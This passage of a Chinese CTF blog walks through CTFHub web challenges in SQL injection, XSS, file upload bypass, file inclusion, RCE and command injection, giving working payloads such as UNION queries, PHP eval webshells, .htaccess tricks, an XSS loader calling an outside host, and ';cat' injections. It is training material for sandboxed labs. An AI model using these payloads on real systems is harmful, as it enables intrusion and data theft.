src="https://img-blog.csdnimg.cn/20200308145945416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>查看 Response，得到flag</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51753_3.png" alt></p><p>有点操作水平。。。。</p><h4 id="响应包源码"><a href="#响应包源码" class="headerlink" title="响应包源码"></a>响应包源码</h4><p>等游戏结束f12查看源码即可</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51433_1.png" alt></p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><a href="http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt" target="_blank" rel="noopener">http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt</a></p><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><a href="http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php" target="_blank" rel="noopener">http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php</a></p><p>ctrl+f一把梭</p><img src="http://images2.5666888.xyz//搜狗截图20年12月23日1437_2.png" style="zoom: 80%;"><p>ctfhub{eff7ead587e67aab8af40775}</p><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>可能有点用的提示：</p><pre><code>#### 常见的网站源码备份文件后缀------- tar- tar.gz- zip- rar#### 常见的网站源码备份文件名------- web- website- backup- back- www- wwwroot- temp</code></pre><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip</a></p><pre><code>\#!usr/bin/env python#_*_ coding:utf-8 _*_import requests url=&quot;http://challenge-9936840b90db7048.sandbox.ctfhub.com:10080/&quot;list1=[&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;] list2=[&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]for i in list1:  for j in list2:         url_f=url+i+&quot;.&quot;+j    r=requests.get(url_f)        if(r.status_code == 200):            print(url_f)</code></pre><p>对没有错，就是通过这个脚本来判断是哪个页面为200</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51522_4.png" alt></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51452_3.png" alt></p><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt</a></p><p>完事！</p><h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>介绍：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>针对index.php.bak文件</p><p>输入下载完以后改为.txt格式打开直接一把梭</p><h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>介绍：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>.index.php.swp</p><p>这里注意index前面有个点</p><p>然后将swp改为txt打开</p><h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>介绍：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>下载完以后用.md文件格式打开</p><p>18c26ec34f6edafc85a7cd5e20853f58.txt发现这个文件</p><p><a href="http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭" target="_blank" rel="noopener">http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭</a></p><h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>介绍：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><p>先用dirsearch.py进行扫描</p><p>python3 dirsearch.py -u <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> -e*</p><pre><code>-u 指定网址 -e 指定网站语言#例如-e php，zip，这里-e*是所有 -t 指定线程 -w 指定字典 -r 递归目录（跑出目录后，继续跑目录下面的目录） --random-agents 使用随机UA(默认在db/uesr-agents.txt中，可以自己添加) -x 排除指定状态码 -s 置请求之间的延时(秒)</code></pre><p>然后用githack脚本跑</p><pre><code>python GitHack.py http://challenge-bf6c3305d834ed77.sandbox.ctfhub.com:10080/.git</code></pre><p>跑完以后去list目录去看看</p><p>进入所下载的文件里面</p><pre><code>git log#使用git log命令查看本地的所有提交</code></pre><p>得：<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51914_4.png" alt></p><pre><code>git reset --hard ea27539d5ad2aa769ee2375400a0a5afc39faab0#彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉；lscat 241282368416724.txt</code></pre><p>得到flag</p><h4 id="stash（储藏）"><a href="#stash（储藏）" class="headerlink" title="stash（储藏）"></a>stash（储藏）</h4><p>理解：</p><p>当你要修改或者变更文件的时候，可以通过这个git statsh命令将其暂时保存到一个堆栈中，就好像是写到一半的文件突然不写了，你要去写另一个文件，这样为了避免这个文件消失，你就要用这个命令将他进行一下储存，然后办完手头的事情后，你就可以继续通过存到栈里面的文件继续进行之前未完成的编辑，而这个题目，就是针对查找通过stash命令存到栈里面的文件</p><p>和上一题一样</p><pre><code>git log//查看历史记录git stash poplscat 13456789.txt说明：$git stash                 ／／把本地修改并且未提交的内容，存储到本地栈中的栈顶。$do some work        ／／此时你可以去切换分支或者pull最新代码$git stash pop          ／／此时你可以把你刚才stash到本地栈中的代码pop到本地</code></pre><h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>启动githack</p><pre><code>python GitHack.py http://challenge-3aa10bcada98b68b.sandbox.ctfhub.com:10080/.git</code></pre><p>将他的git文件clone到本地然后查看就直接一把</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51208_1.png" alt></p><h3 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h3><p>引子：</p><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><h4 id="去网上了解一下svn漏洞："><a href="#去网上了解一下svn漏洞：" class="headerlink" title="去网上了解一下svn漏洞："></a>去网上了解一下svn漏洞：</h4><h5 id="什么是SVN"><a href="#什么是SVN" class="headerlink" title="什么是SVN?"></a>什么是SVN?</h5><p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。<br>在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。</p><p>用到的工具：dvcs-ripper</p><p>用dirsearch跑了一下.svn发现确实有，可能方法不对，跑都跑不完</p><p>然后开始回归正常操作：</p><p>1.下载所需要的工具：</p><pre><code>git clone https://github.com/kost/dvcs-ripper /svn</code></pre><p>我这里是将它下载到svn目录里面</p><p>2.使用</p><pre><code>perl rip-svn.pl -u http://challenge-30d239a5f2b26f23.sandbox.ctfhub.com:10080/.svn/</code></pre><p>补充：需要注意的是，.svn是隐藏文件，在linux下必须ls -al才能看到。<br>3.根据题目的提示，Flag 在服务端旧版本的源代码中。<br>注意那个tree中的pristine，里面一般存储的是代码的历史版本。我们直接进入目录，然后读取文件就可以得到flag了</p><p>问题：该软件不能正常使用，需要配置组件（暂未解决）</p><h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>我的密码是admin123</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51352_2.png" alt></p><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><p>这个题看很特别，看别人wp上说：是通过网上搜索eyou的默认口令来进入网站</p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/108274723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45785288/article/details/108274723</a></p><p>考查的信息收集能力</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><h4 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h4><p>输入1得到Data: ctfhub输入2得到Data：skill输入3没有回显，输入1 or 1=1也会显示1的内容这是直接显示出来了？</p><h4 id="2-构造注入语句"><a href="#2-构造注入语句" class="headerlink" title="2.构造注入语句"></a>2.构造注入语句</h4><h5 id="a-得到数据库"><a href="#a-得到数据库" class="headerlink" title="a.得到数据库"></a>a.得到数据库</h5><p>-1 union select 1,2</p><p>得到回显Data: 2</p><p>-1 union select 1,3</p><p>得到回显Data: 3</p><p>-1 union select 1,database()</p><p>回显Data: sqli（得到数据库）</p><h5 id="b-得到数据库里面的表"><a href="#b-得到数据库里面的表" class="headerlink" title="b.得到数据库里面的表"></a>b.得到数据库里面的表</h5><p>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=”sqli”</p><p>得到回显：</p><p>Data: news,flag</p><h5 id="c-爆列名"><a href="#c-爆列名" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=”flag”</p><p>得到回显：</p><p>Data: flag</p><h5 id="d-爆字段"><a href="#d-爆字段" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>-1 union select 1,group_concat(flag) from flag</p><p>得到回显：</p><p>Data: ctfhub{3040c5c414ba645535376218}</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>就像整数型一样，但是区别于有单引号需要自己构造单引号语句来让其失效</p><h4 id="1-查看数据库的列数"><a href="#1-查看数据库的列数" class="headerlink" title="1.查看数据库的列数"></a>1.查看数据库的列数</h4><p>1’ order by 3 – ‘发现报错，那么改为2 ：1’ order by 2 – ‘得到回显</p><p>说明有两列</p><h4 id="2-联合查询"><a href="#2-联合查询" class="headerlink" title="2.联合查询"></a>2.联合查询</h4><h5 id="a-爆库名"><a href="#a-爆库名" class="headerlink" title="a.爆库名"></a>a.爆库名</h5><p>这是获取所有数据库的语句：</p><p>‘ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p><p>发现information_schema是一个数据库</p><p>‘ union select 1,database()#</p><p>得到了sqli</p><h5 id="b-爆表"><a href="#b-爆表" class="headerlink" title="b.爆表"></a>b.爆表</h5><p>‘ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=’sqli’ – ‘</p><h5 id="c-爆列名-1"><a href="#c-爆列名-1" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’#</p><h5 id="d-爆字段-1"><a href="#d-爆字段-1" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>‘ union select 1,group_concat(flag) from flag – ‘</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>利用xss platform平台创建一个xss反射型的脚本</p><pre><code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xs.sb/wnbP&gt;&lt;/sCrIpT&gt;</code></pre><p>没什么好记的操作很简单直接上大佬的wp</p><p><a href="https://blog.csdn.net/weixin_43486981/article/details/107974878" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43486981/article/details/107974878</a></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>一句话，一把梭</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_4.png" alt></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_5.png" alt></p><h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>与无验证的区别在于对于上传的文件格式的后缀有规定</p><p>所以：shell.php.png 安排只要保证能传上去就行了，同时抓包去掉.png保证蚁剑可以识别</p><p>然后重复一句话，一把梭操作即可</p><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>介绍：</p><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p><p>理解：</p><p>看到这，明白了，就好比你即使上传的是png文件，但是通过htaccess文件的解析，你依然是php文件</p><p>大佬的代码：</p><p>//方法一 SetHandler application/x-httpd-php      //所有的文件当做php文件来解析 </p><p>//方法二 AddType application/x-httpd-php .png    //.png文件当作php文件解析</p><p>上传顺序：</p><p>先制作.htaccess再来shell.png（毕竟进行了前端验证）</p><p>1.AddType application/x-httpd-php .png</p><p>2.<?php @eval($_POST['666']);?>一句话，一把梭</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>引子：</p><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><p>通过介绍可以看出来，这种类型的过滤不是针对文件后缀名，而是根据http响应头信息，所以一定要通过抓包进行分析：</p><p>如果直接传的话会出现下面结果：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51052_1.png" alt></p><p>但是如果将：</p><p>Content-Type: application/octet-stream</p><p>改为：</p><p>Content-Type: image/png</p><p>就会显示上传成功</p><p>然后一句话，一把梭</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>引子:</p><p><strong>%00截断的两个条件</strong></p><ul><li>php &lt; 5.3.4</li><li>magic_quotes_gpc = off</li></ul><p>木马的文件格式为：phpwebshell.php%00.jpg</p><p>但是这个题需要截断的地方不是从文件的后缀进行截断，而是在响应后信息进行修改</p><p><strong>分析源码：</strong></p><pre><code>if (!empty($_POST[&#39;submit&#39;])) {    $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    $info = pathinfo($name);    $ext = $info[&#39;extension&#39;];    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);    if (in_array($ext, $whitelist)) {        $des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) {            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;/script&gt;&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;/script&gt;&quot;;        }    } else {        echo &quot;文件类型不匹配&quot;;    }}</code></pre><p>$_FILES 解释（搬自php手册）<br>$_FILES 数组内容如下:</p><p>$_FILES【‘myFile’][‘name’] 客户端文件的原名称。</p><p>$_FILES【‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</p><p>$_FILES【‘myFile’][‘size’] 已上传文件的大小，单位为字节。</p><p>$_FILES【‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</p><p>$_FILES【‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)</p><p>basename() 函数：返回路径中的文件名部分。<br>$_name 是上传的文件名加后缀<br>$_ext 得到的就是后缀名<br>重点就在 $des这个变量<br>得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名看到这里基本可看出来，如果直接上传的话，文件是会被重新命名的，所以这里就有一个办法就是在</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51239_3.png" alt></p><p>这里为自己拟定一个文件名字，并且使用00截断后面自动生成的信息，这样就可以防止你上传的文件被认定为临时文件了</p><p>可以看到之前上传的文件都是被认定为临时文件：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51237_2.png" alt></p><p>最后上传的路径为/uoload/1.php然后一句话，一把梭</p><h5 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h5><p>直接不做修改的上传发现：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51248_4.png" alt></p><p>php没了！！！</p><p>所以这里关于绕过，而且明显告诉是双写，那就：</p><p>shell.pphphp</p><p>成功了，一把梭（关于怎么绕过要自己不断尝试，即可）</p><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>都说是文件头检查了，那肯定就是抓包啊</p><p>将文件改为这个</p><p>Content-Type: image/png</p><p>但是说我文件错误，是文件错误，那么就准备改文件，</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>把随便一个图片用hex打开发现他头部信息就是这个GIF89a</p><p>然后继续上传准备一把梭</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51301_5.png" alt></p><p>success</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p>题目：</p><pre><code>&lt;?phpif (isset($_REQUEST[&#39;cmd&#39;])) {    eval($_REQUEST[&quot;cmd&quot;]);} else {    highlight_file(__FILE__);}?&gt;</code></pre><ul><li>eval():该函数可以把字符串作为PHP代码执行</li><li>$_REQUEST[’’]:和GET和POST类似，不过反应速度比较慢</li></ul><p>大体意思是：判断cmd是否被设置，若cmd被赋值，则执行如下语句，否则就继续显示以上代码。<br>方法一：</p><p>eval($_REQUEST[“cmd”]);</p><p>通过蚁剑直接连接，密码cmd</p><p>方法二：</p><p>构造URL：?cmd=system(“ls”);</p><p>发现了index.php</p><p>继续构造?cmd=system(“cd /;ls”);</p><p>得到：bin boot dev etc flag_30765 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p>构造：</p><p>?cmd=system(“cd /;cat flag_30765”);</p><p>success</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre><code>&lt;?php// 关闭错误报告error_reporting(0);if (isset($_GET[&#39;file&#39;])) {//strpos — 查找字符串首次出现的位置    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {        include $_GET[&quot;file&quot;];    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;</code></pre><p>函数解释：</p><pre><code>#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</code></pre><p>发现一个shell</p><pre><code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据$_REQUEST 变量既可以收集GET方法发送的数据，也可以接受POST方法接受的数据</code></pre><p>直接蚁剑吧，发现是txt文件，没办法连接</p><p>因为题目给出：</p><p>i have a <a href="shell.txt">shell</a>, how to use it ?</p><p>所以构造参数：</p><p><a href="http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt" target="_blank" rel="noopener">http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt</a></p><p>然后使用hackbar的postdata传参</p><p>ctfhub=system(‘ls’);</p><p>ctfhub=system(‘ls /‘);</p><p>ctfhub=system(‘cat /flag’);</p><p>得到flag</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>题型：php伪协议</p><pre><code>php://input特点如下:1）、Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST2）、PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA3）、只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。填入的长度，由Coentent-Length指定。4）、只有Content-Type为application/x-www-data-urlencoded时，php://input数据才跟$_POST数据相一致。5）、php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini6）、PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。总结起来就是，在用$_POST获取不到由APP或者一些接口的回调数据时,就用php://input试试</code></pre><p>题目：</p><pre><code>&lt;?phpif (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;i don&#39;t have shell, how to get flag? phpinfo</code></pre><p>这个应该也是get传参，开头的格式也是?file=,也就是说先对你输入的文件的前六个字符进行判断，如果是php://的话就执行一个php文件，如果不是就gg</p><p>搜索了一下发现这是属于php伪协议的一种类型：</p><p>php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>http:/xxx/index.php?file=php://input</code></pre><p>其他伪协议可见链接：</p><p><a href="https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control" target="_blank" rel="noopener">https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control</a> (很好的一个写给萌新wp的博主，更多伪协议见下方的推荐其他的文章)</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A51747_1.png" alt></p><p>然后则这样就可以了</p><p>补充一个语句：<?php system("find / -name flag*");?>用这个找挺方便的</p><h5 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h5><p>题目：</p><pre><code>&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);    //highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，会显示规定要显示的文件}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;i don&#39;t have shell, how to get flag? flag in /flag</code></pre><p>和上一题一样我感觉，但是并不好用</p><pre><code>resource=&lt;要过滤的数据流&gt;            指定了你要筛选过滤的数据流。    必选read=&lt;读链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选write=&lt;写链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选&lt;；两个链的筛选列表&gt;               任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</code></pre><p>这里就不能将指令POST上去了，图中又提示了必须使用<code>php://</code>，FLAG在/flag内，因此想到过滤器filter</p><p>考虑到php伪协议里面的直接读取一个文件里面的内容的一个伪协议↓</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=/flag（有绝对路径的限制下只用）?file=php://filter/resource=/flag</code></pre><p>也可以去掉 <code>read</code>绕过一些限制函数</p><p>success</p><p>考查知识点：php://filter过滤器</p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>题目：</p><pre><code>&lt;?phperror_reporting(0);if (isset($_GET[&#39;file&#39;])) {    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {        include $_GET[&quot;file&quot;];    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;i don&#39;t have shell, how to get flag?phpinfo</code></pre><p>也是：?file=来进行传参</p><p>让我看phpinfo文件，因为根据前面题总结的经验只要这个allow_url_include = On是开的就可以利用php://伪协议，点开phpinfo发现确实是开的，所以抓包试试，success</p><p>此题目和php://input做法一样</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>题目：</p><pre><code>&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $cmd = &quot;ping -c 4 {$_GET[&#39;ip&#39;]}&quot;;    exec($cmd, $res);}?&gt;</code></pre><p>输入框打入：127.0.0.1;ls</p><p>得到</p><pre><code>Array(    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes    [1] =&gt; 24024115330223.php    [2] =&gt; index.php)</code></pre><p>然后输入：127.0.0.1;cat 24024115330223.php</p><p>页面没有显示，但是在源代码里面显示了flag</p><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>题目：</p><pre><code>&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $ip = $_GET[&#39;ip&#39;];    $m = [];    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) {        $cmd = &quot;ping -c 4 {$ip}&quot;;        